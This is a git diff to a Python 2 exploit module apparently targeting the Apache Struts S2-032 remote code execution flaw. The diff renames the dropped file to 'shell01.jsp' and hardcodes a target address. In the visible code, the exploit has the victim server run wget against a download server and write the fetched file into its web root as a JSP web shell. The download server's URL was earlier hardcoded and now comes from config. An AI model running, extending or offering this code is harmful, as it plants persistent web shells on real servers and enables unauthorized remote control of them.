@@ -1,8 +1,9 @@
 # coding:utf-8
 import sys
-# sys.path.append('..')
 import re
-from exp_template import Exploit, Level, session
+from struts2.exp_template import Exploit, Level, session
+
+from conf import config
 
 """
 构造函数需要传递以下参数
@@ -65,7 +66,7 @@ class S2032(Exploit):
             return False
 
     def wgetfile(self, serverurl, filepath):
-        cmd = ''' wget {} -O {}test.jsp'''.format(serverurl, filepath)
+        cmd = ''' wget {} -O {}shell01.jsp'''.format(serverurl, filepath)
         response = self.executecmd(cmd)
         return response
 
@@ -76,7 +77,7 @@ class S2032(Exploit):
         poc = self.ifpoc()
         if poc:
             webpath = self.getwebpath()
-            serverurl = '''http://172.22.209.33:8014/api/download'''
+            serverurl = config['serverurl']
             res = self.wgetfile(serverurl, webpath)
             self.report('wget file {}'.format(res), Level.info)
             return True
@@ -85,7 +86,11 @@ class S2032(Exploit):
 
 
 if __name__ == '__main__':
-    if len(sys.argv) == 2:
-        s = S2032(sys.argv[1])
-        res = s.exploit()
-        print res
+    url = 'http://192.168.40.26:8082'
+    s = S2032(url)
+    res = s.exploit()
+    print res
+    # if len(sys.argv) == 2:
+    #     s = S2032(sys.argv[1])
+    #     res = s.exploit()
+    #     print res
